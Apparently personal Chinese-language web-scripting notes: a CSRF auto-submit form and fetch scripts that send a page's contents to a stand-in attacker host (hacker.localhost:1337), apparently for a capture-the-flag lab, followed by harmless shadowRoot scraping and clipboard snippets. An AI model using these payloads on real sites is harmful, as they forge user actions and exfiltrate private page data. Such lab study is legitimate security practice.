```html
<html>
<body>
    <form action=http://challenge.localhost:80/publish method=post>
        <input type=submit value=csrf>
    </form>
    <script>
        document.forms[0].submit()
    </script>
</body>
</html>
```

```html
<script>
fetch('/')
    .then(resp => resp.text())
    .then(text => 
        fetch("http://hacker.localhost:1337/", {
            method: "POST",
            body: text
        }))
</script>
```

以表单格式发送数据
```html
<script>
let formData = new FormData();
formData.append("名", "值");
fetch('/')
    .then(resp => resp.text())
    .then(text => 
        fetch("http://hacker.localhost:1337/", {
            method: "POST",
            body: formData
        }))
</script>
```

## 复制数据

复制到粘贴板，有时被阻止
```js
navigator.clipboard.writeText(out_str);
```

## ShadowRoot

https://developer.mozilla.org/zh-CN/docs/Web/API/ShadowRoot

Shadow DOM API 的 ShadowRoot 接口是一个 DOM 子树的根节点，它与文档的主 DOM 树分开渲染。

你可以通过使用一个元素的 Element.shadowRoot 属性来检索它的参考，假设它是由 Element.attachShadow() 创建的并使 mode 设置为 open.

```js
// 逐步添加字符串，最终使用剪贴板复制数据
let out_str = ""; 
// 选取最外层 shadowRoot
const egs_footer = document.querySelector("egs-footer").shadowRoot;
console.log(footer_cols.length); // 查看选取是否正确

// 选取其中各段
const footer_cols = egs_footer.querySelectorAll("epic-wf-footer-link-column");
console.log(footer_cols.length); // 查看选取是否正确

// 遍历各段
footer_cols.forEach(footer_col => {
    // 查看当前段的类型
    const col_type = footer_col.getAttribute("heading");
    console.log(col_type); 
    out_str += `${col_type}\n`;
    // 选取每段的 shadowRoot
    const footer_col_sr = footer_col.shadowRoot;
    // 选取链接元素合集
    const footer_link = footer_col_sr.querySelectorAll("epic-wf-footer-link");
    console.log(footer_link.length); // 查看选取是否正确

    // 遍历所有链接
    footer_link.forEach(link => {
        const label = link.getAttribute('label') || '';
        const href_template = link.getAttribute('hreftemplate') || '';

        let cur_str = `- ${label}\n\t- \`${href_template}\`\n`;
        console.log(cur_str);
        out_str += cur_str;
    });
});

// 复制最终输出字符串到粘贴板
navigator.clipboard.writeText(out_str).catch(()=>{
    // 若失败，则输出到控制台后手动复制
    console.log(out_str);
});
```

```js
let out_str = ""; 

const x = document.querySelectorAll(".cc-rewards-link-table__endpoint");

x.forEach(link => {
        const label = link.textContent || '';


        let cur_str = `${label}\n`;
        console.log(cur_str);
        out_str += cur_str;
    });

navigator.clipboard.writeText(out_str).catch(()=>{
    // 若失败，则输出到控制台后手动复制
    console.log(out_str);
});
```

